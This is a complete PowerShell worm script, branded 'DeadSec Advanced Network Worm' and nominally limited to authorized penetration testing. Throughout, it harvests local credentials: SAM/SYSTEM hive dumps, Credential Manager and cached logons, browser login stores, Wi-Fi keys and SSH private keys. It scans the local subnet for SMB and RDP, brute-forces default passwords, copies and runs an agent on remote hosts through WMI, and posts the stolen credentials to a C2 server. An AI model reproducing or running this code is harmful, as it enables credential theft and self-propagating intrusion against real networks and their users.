<#
.SYNOPSIS
    DeadSec Advanced Network Worm - PowerShell Edition
    Exploit kits + Credential harvesting + Lateral movement
    
.DESCRIPTION
    FOR AUTHORIZED PENETRATION TESTING ONLY
    
.PARAMETER C2Server
    C2 server URL for reporting
    
.PARAMETER Aggressive
    Enable aggressive scanning mode
    
.EXAMPLE
    .\advanced_worm.ps1 -C2Server "http://192.168.1.10:5000"
#>

param(
    [Parameter(Mandatory=$false)]
    [string]$C2Server = "http://localhost:5000",
    
    [switch]$Aggressive
)

# Credential Harvester Module
class CredentialHarvester {
    [System.Collections.ArrayList]$Credentials
    
    CredentialHarvester() {
        $this.Credentials = @()
    }
    
    [bool] IsAdmin() {
        $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
        return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    }
    
    [array] DumpLSASS() {
        $creds = @()
        
        if ($this.IsAdmin()) {
            try {
                # Save SAM and SYSTEM hives
                reg save HKLM\SAM "$env:TEMP\sam.save" /y 2>$null
                reg save HKLM\SYSTEM "$env:TEMP\system.save" /y 2>$null
                
                if (Test-Path "$env:TEMP\sam.save") {
                    $creds += @{
                        Type = "SAM_Dump"
                        Status = "Success"
                        Files = @("$env:TEMP\sam.save", "$env:TEMP\system.save")
                    }
                }
            }
            catch {
                Write-Host "[!] LSASS dump failed: $_"
            }
        }
        
        return $creds
    }
    
    [array] ExtractCachedCredentials() {
        $creds = @()
        
        try {
            $cmdkeyOutput = cmdkey /list
            
            if ($cmdkeyOutput) {
                $creds += @{
                    Type = "Cached_Credentials"
                    Data = $cmdkeyOutput -join "`n"
                }
            }
        }
        catch {}
        
        return $creds
    }
    
    [array] ExtractCredentialManager() {
        $creds = @()
        
        try {
            [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime] | Out-Null
            $vault = New-Object Windows.Security.Credentials.PasswordVault
            
            $vault.RetrieveAll() | ForEach-Object {
                try {
                    $_.RetrievePassword()
                    $creds += @{
                        Type = "Credential_Manager"
                        Resource = $_.Resource
                        Username = $_.UserName
                        Password = $_.Password
                    }
                }
                catch {}
            }
        }
        catch {}
        
        return $creds
    }
    
    [array] ExtractChromePasswords() {
        $creds = @()
        
        try {
            $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
            
            if (Test-Path $chromePath) {
                $tempDB = "$env:TEMP\chrome_temp.db"
                Copy-Item $chromePath $tempDB -Force
                
                try {
                    # Note: Requires SQLite
                    $creds += @{
                        Type = "Chrome_Passwords"
                        Status = "Database copied"
                        Path = $tempDB
                        Note = "Requires SQLite parsing and decryption"
                    }
                }
                finally {
                    Remove-Item $tempDB -ErrorAction SilentlyContinue
                }
            }
        }
        catch {}
        
        return $creds
    }
    
    [array] ExtractFirefoxPasswords() {
        $creds = @()
        
        try {
            $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
            
            if (Test-Path $firefoxPath) {
                Get-ChildItem $firefoxPath -Filter "*.default*" | ForEach-Object {
                    $loginsFile = Join-Path $_.FullName "logins.json"
                    
                    if (Test-Path $loginsFile) {
                        $loginsData = Get-Content $loginsFile | ConvertFrom-Json
                        
                        foreach ($login in $loginsData.logins) {
                            $creds += @{
                                Type = "Firefox_Password"
                                Hostname = $login.hostname
                                Username = $login.encryptedUsername
                                Note = "Requires decryption"
                            }
                        }
                    }
                }
            }
        }
        catch {}
        
        return $creds
    }
    
    [array] ExtractWiFiPasswords() {
        $creds = @()
        
        try {
            $profiles = (netsh wlan show profiles) | Select-String "All User Profile\s*:\s*(.*)" | ForEach-Object {
                $_.Matches.Groups[1].Value.Trim()
            }
            
            foreach ($profile in $profiles) {
                $passData = netsh wlan show profile name="$profile" key=clear
                $password = ($passData | Select-String "Key Content\s*:\s*(.*)").Matches.Groups[1].Value.Trim()
                
                if ($password) {
                    $creds += @{
                        Type = "WiFi_Password"
                        SSID = $profile
                        Password = $password
                    }
                }
            }
        }
        catch {}
        
        return $creds
    }
    
    [array] ExtractSSHKeys() {
        $creds = @()
        
        try {
            $sshPath = "$env:USERPROFILE\.ssh"
            
            if (Test-Path $sshPath) {
                Get-ChildItem $sshPath -Filter "id_*" | Where-Object { $_.Name -notlike "*.pub" } | ForEach-Object {
                    $keyData = Get-Content $_.FullName -Raw
                    
                    $creds += @{
                        Type = "SSH_Private_Key"
                        Filename = $_.Name
                        Path = $_.FullName
                        Preview = $keyData.Substring(0, [Math]::Min(100, $keyData.Length))
                    }
                }
            }
        }
        catch {}
        
        return $creds
    }
    
    [array] HarvestAll() {
        Write-Host "[*] Starting credential harvesting..."
        
        $allCreds = @()
        
        # Windows-specific
        $allCreds += $this.DumpLSASS()
        $allCreds += $this.ExtractCachedCredentials()
        $allCreds += $this.ExtractCredentialManager()
        
        # Browsers
        $allCreds += $this.ExtractChromePasswords()
        $allCreds += $this.ExtractFirefoxPasswords()
        
        # Network
        $allCreds += $this.ExtractWiFiPasswords()
        $allCreds += $this.ExtractSSHKeys()
        
        $this.Credentials = $allCreds
        
        Write-Host "[+] Harvested $($allCreds.Count) credential sets"
        
        return $allCreds
    }
}

# Exploit Kit Module
class ExploitKit {
    [hashtable]$Vulnerabilities
    
    ExploitKit() {
        $this.Vulnerabilities = @{}
    }
    
    [hashtable] CheckEternalBlue([string]$TargetIP) {
        try {
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $connect = $tcpClient.BeginConnect($TargetIP, 445, $null, $null)
            $wait = $connect.AsyncWaitHandle.WaitOne(2000, $false)
            
            if ($wait) {
                $tcpClient.EndConnect($connect)
                $tcpClient.Close()
                
                return @{
                    Vulnerable = "POSSIBLE"
                    Exploit = "MS17-010 (EternalBlue)"
                    Port = 445
                    Severity = "CRITICAL"
                    Note = "SMB port open, manual verification needed"
                }
            }
            
            $tcpClient.Close()
        }
        catch {}
        
        return @{ Vulnerable = $false }
    }
    
    [hashtable] CheckBlueKeep([string]$TargetIP) {
        try {
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $connect = $tcpClient.BeginConnect($TargetIP, 3389, $null, $null)
            $wait = $connect.AsyncWaitHandle.WaitOne(2000, $false)
            
            if ($wait) {
                $tcpClient.EndConnect($connect)
                $tcpClient.Close()
                
                return @{
                    Vulnerable = "POSSIBLE"
                    Exploit = "CVE-2019-0708 (BlueKeep)"
                    Port = 3389
                    Severity = "CRITICAL"
                    Note = "RDP port open, manual verification needed"
                }
            }
            
            $tcpClient.Close()
        }
        catch {}
        
        return @{ Vulnerable = $false }
    }
    
    [hashtable] CheckPrintNightmare([string]$TargetIP) {
        try {
            # Check if Print Spooler is accessible
            $service = Get-Service -ComputerName $TargetIP -Name "Spooler" -ErrorAction SilentlyContinue
            
            if ($service -and $service.Status -eq 'Running') {
                return @{
                    Vulnerable = "POSSIBLE"
                    Exploit = "CVE-2021-34527 (PrintNightmare)"
                    Service = "Print Spooler"
                    Severity = "HIGH"
                    Note = "Print Spooler running"
                }
            }
        }
        catch {}
        
        return @{ Vulnerable = $false }
    }
    
    [array] ScanAllExploits([string]$TargetIP) {
        Write-Host "[*] Scanning $TargetIP for exploits..."
        
        $vulns = @()
        
        # Check EternalBlue
        $eb = $this.CheckEternalBlue($TargetIP)
        if ($eb.Vulnerable) { $vulns += $eb }
        
        # Check BlueKeep
        $bk = $this.CheckBlueKeep($TargetIP)
        if ($bk.Vulnerable) { $vulns += $bk }
        
        # Check PrintNightmare
        $pn = $this.CheckPrintNightmare($TargetIP)
        if ($pn.Vulnerable) { $vulns += $pn }
        
        return $vulns
    }
    
    [bool] ExploitEternalBlue([string]$TargetIP) {
        Write-Host "[*] Attempting EternalBlue exploit on $TargetIP"
        
        try {
            # Try guest SMB access
            $result = net use "\\$TargetIP\IPC`$" /user:guest "" 2>&1
            
            if ($LASTEXITCODE -eq 0) {
                Write-Host "[+] SMB access gained on $TargetIP"
                return $true
            }
        }
        catch {}
        
        return $false
    }
}

# Advanced Worm Main Class
class AdvancedWorm {
    [string]$WormID
    [string]$C2Server
    [array]$InfectedHosts
    [array]$HarvestedCredentials
    [hashtable]$Vulnerabilities
    [CredentialHarvester]$CredHarvester
    [ExploitKit]$ExploitKit
    
    AdvancedWorm([string]$c2) {
        $this.C2Server = $c2
        $this.WormID = $this.GenerateWormID()
        $this.InfectedHosts = @()
        $this.HarvestedCredentials = @()
        $this.Vulnerabilities = @{}
        $this.CredHarvester = [CredentialHarvester]::new()
        $this.ExploitKit = [ExploitKit]::new()
    }
    
    [string] GenerateWormID() {
        $randomPart = -join ((65..90) + (48..57) | Get-Random -Count 8 | ForEach-Object {[char]$_})
        $hostname = $env:COMPUTERNAME
        $hash = [System.BitConverter]::ToString([System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hostname))).Replace("-","").Substring(0,8)
        return "WORM-$hash-$randomPart"
    }
    
    [string] GetLocalIP() {
        try {
            $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"} | Select-Object -First 1).IPAddress
            return $ip
        }
        catch {
            return "127.0.0.1"
        }
    }
    
    [string] GetNetworkRange() {
        $localIP = $this.GetLocalIP()
        $octets = $localIP.Split('.')
        return "$($octets[0]).$($octets[1]).$($octets[2]).0/24"
    }
    
    [array] ScanHost([string]$ip) {
        $openPorts = @()
        $ports = @(445, 3389, 135, 22, 5985)
        
        foreach ($port in $ports) {
            try {
                $tcpClient = New-Object System.Net.Sockets.TcpClient
                $connect = $tcpClient.BeginConnect($ip, $port, $null, $null)
                $wait = $connect.AsyncWaitHandle.WaitOne(500, $false)
                
                if ($wait) {
                    $tcpClient.EndConnect($connect)
                    $openPorts += $port
                }
                
                $tcpClient.Close()
            }
            catch {}
        }
        
        return $openPorts
    }
    
    [bool] BruteForceAccess([string]$ip) {
        $creds = @(
            @("admin", "admin"),
            @("administrator", "password"),
            @("administrator", "Admin123"),
            @("root", "root")
        )
        
        foreach ($cred in $creds) {
            try {
                $username = $cred[0]
                $password = $cred[1]
                
                $result = net use "\\$ip\IPC`$" $password /user:$username 2>&1
                
                if ($LASTEXITCODE -eq 0) {
                    Write-Host "[+] Access gained: $username`:$password@$ip"
                    return $true
                }
            }
            catch {}
        }
        
        return $false
    }
    
    [bool] DeployAgent([string]$ip) {
        try {
            $agentPath = Join-Path (Split-Path $PSScriptRoot) "payloads\windows_agent.ps1"
            
            if (Test-Path $agentPath) {
                # Copy via SMB
                $remotePath = "\\$ip\C`$\Temp\agent.ps1"
                Copy-Item $agentPath $remotePath -Force -ErrorAction Stop
                
                # Execute via WMI
                $result = Invoke-WmiMethod -ComputerName $ip -Class Win32_Process -Name Create -ArgumentList "powershell -ExecutionPolicy Bypass -File C:\Temp\agent.ps1"
                
                if ($result.ReturnValue -eq 0) {
                    Write-Host "[+] Agent deployed on $ip"
                    return $true
                }
            }
        }
        catch {
            Write-Host "[!] Deployment failed: $_"
        }
        
        return $false
    }
    
    [void] ReportToC2() {
        try {
            $reportData = @{
                worm_id = $this.WormID
                infected_hosts = $this.InfectedHosts
                credentials = $this.HarvestedCredentials
                vulnerabilities = $this.Vulnerabilities
                timestamp = (Get-Date).ToString("o")
            } | ConvertTo-Json -Depth 10
            
            $response = Invoke-RestMethod -Uri "$($this.C2Server)/worm_report" -Method Post -Body $reportData -ContentType "application/json" -TimeoutSec 10
            
            Write-Host "[+] Report sent to C2"
        }
        catch {
            Write-Host "[!] Failed to report to C2: $_"
        }
    }
    
    [void] Propagate() {
        Write-Host ""
        Write-Host "============================================================" -ForegroundColor Cyan
        Write-Host "  DEADSEC ADVANCED WORM // EXPLOIT + HARVEST" -ForegroundColor Cyan
        Write-Host "============================================================" -ForegroundColor Cyan
        Write-Host ""
        Write-Host "[*] Worm ID: $($this.WormID)"
        Write-Host "[*] Local IP: $($this.GetLocalIP())"
        Write-Host "[*] Network: $($this.GetNetworkRange())"
        
        # Phase 1: Credential Harvesting
        Write-Host ""
        Write-Host "[PHASE 1] LOCAL CREDENTIAL HARVESTING" -ForegroundColor Yellow
        Write-Host "============================================================"
        $this.HarvestedCredentials = $this.CredHarvester.HarvestAll()
        
        # Phase 2: Network Scanning
        Write-Host ""
        Write-Host "[PHASE 2] NETWORK RECONNAISSANCE" -ForegroundColor Yellow
        Write-Host "============================================================"
        
        $network = $this.GetNetworkRange()
        $baseIP = ($network.Split('/')[0].Split('.')[0..2]) -join '.'
        
        $targets = 1..50 | ForEach-Object { "$baseIP.$_" } | Where-Object { $_ -ne $this.GetLocalIP() }
        
        Write-Host "[*] Scanning $($targets.Count) targets..."
        
        foreach ($ip in $targets) {
            Write-Host "[*] Scanning $ip..."
            
            $openPorts = $this.ScanHost($ip)
            
            if ($openPorts.Count -gt 0) {
                Write-Host "[+] $ip - Open ports: $($openPorts -join ', ')" -ForegroundColor Green
                
                # Scan for exploits
                $vulns = $this.ExploitKit.ScanAllExploits($ip)
                
                if ($vulns.Count -gt 0) {
                    Write-Host "[!] $ip - Found $($vulns.Count) vulnerabilities!" -ForegroundColor Red
                    $this.Vulnerabilities[$ip] = $vulns
                    
                    # Attempt exploitation
                    $exploited = $false
                    
                    foreach ($vuln in $vulns) {
                        if ($vuln.Exploit -like "*EternalBlue*") {
                            $exploited = $this.ExploitKit.ExploitEternalBlue($ip)
                            if ($exploited) { break }
                        }
                    }
                    
                    if (-not $exploited) {
                        $exploited = $this.BruteForceAccess($ip)
                    }
                    
                    if ($exploited) {
                        $this.InfectedHosts += $ip
                        $this.DeployAgent($ip)
                    }
                }
            }
        }
        
        # Phase 3: Report to C2
        Write-Host ""
        Write-Host "[PHASE 3] REPORTING TO C2" -ForegroundColor Yellow
        Write-Host "============================================================"
        $this.ReportToC2()
        
        Write-Host ""
        Write-Host "[+] Worm execution complete" -ForegroundColor Green
        Write-Host "[+] Infected hosts: $($this.InfectedHosts.Count)"
        Write-Host "[+] Credentials harvested: $($this.HarvestedCredentials.Count)"
        Write-Host "[+] Vulnerabilities found: $(($this.Vulnerabilities.Values | Measure-Object).Count)"
    }
}

# Main Execution
$worm = [AdvancedWorm]::new($C2Server)
$worm.Propagate()
